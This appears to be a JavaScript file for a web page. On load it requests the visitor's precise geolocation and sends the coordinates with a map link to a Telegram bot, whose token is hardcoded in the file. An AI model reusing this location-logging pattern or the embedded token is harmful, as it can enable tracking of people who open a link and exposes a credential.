// إعدادات البوت
const BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
const CHAT_ID = ''; // اتركه فارغاً للإرسال إلى دردشة البوت

// عناصر DOM
const statusDiv = document.getElementById('status');
const locationInfoDiv = document.getElementById('locationInfo');
const latitudeSpan = document.getElementById('latitude');
const longitudeSpan = document.getElementById('longitude');
const accuracySpan = document.getElementById('accuracy');
const mapLink = document.getElementById('mapLink');

// طلب الموقع عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    if (!navigator.geolocation) {
        showError("المتصفح لا يدعم خدمة الموقع الجغرافي");
        return;
    }
    
    updateStatus("جاري طلب إذن الوصول إلى موقعك...", 'loading');
    navigator.geolocation.getCurrentPosition(
        handleLocationSuccess,
        handleLocationError,
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
});

// عند نجاح الحصول على الموقع
async function handleLocationSuccess(position) {
    const { latitude, longitude, accuracy } = position.coords;
    
    // عرض المعلومات للمستخدم
    displayLocationInfo(latitude, longitude, accuracy);
    
    // إرسال البيانات إلى تليجرام
    try {
        updateStatus("جاري إرسال الموقع إلى تليجرام...", 'loading');
        await sendToTelegram(latitude, longitude, accuracy);
        updateStatus("تم إرسال موقعك بنجاح!", 'success');
    } catch (error) {
        showError(`فشل الإرسال: ${error.message}`);
        console.error('Error:', error);
    }
}

// عند حدوث خطأ
function handleLocationError(error) {
    let errorMessage = "حدث خطأ غير متوقع";
    switch(error.code) {
        case error.PERMISSION_DENIED:
            errorMessage = "تم رفض إذن الوصول إلى الموقع";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMessage = "معلومات الموقع غير متاحة";
            break;
        case error.TIMEOUT:
            errorMessage = "انتهى وقت طلب الموقع";
            break;
    }
    showError(errorMessage);
}

// عرض معلومات الموقع
function displayLocationInfo(lat, lng, accuracy) {
    latitudeSpan.textContent = lat.toFixed(6);
    longitudeSpan.textContent = lng.toFixed(6);
    accuracySpan.textContent = Math.round(accuracy);
    
    // إنشاء رابط خرائط جوجل
    const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
    mapLink.href = mapUrl;
    
    locationInfoDiv.style.display = 'block';
}

// إرسال البيانات إلى تليجرام
async function sendToTelegram(lat, lng, accuracy) {
    const message = `📍 موقع جديد:
- خط العرض: ${lat.toFixed(6)}
- خط الطول: ${lng.toFixed(6)}
- الدقة: ${Math.round(accuracy)} متر
- الرابط: https://www.google.com/maps?q=${lat},${lng}`;
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            disable_web_page_preview: false
        })
    });
    
    const data = await response.json();
    if (!data.ok) {
        throw new Error(data.description || "فشل إرسال الرسالة");
    }
}

// تحديث حالة الواجهة
function updateStatus(message, className) {
    statusDiv.textContent = message;
    statusDiv.className = `status-box ${className}`;
}

function showError(message) {
    updateStatus(message, 'error');
                }
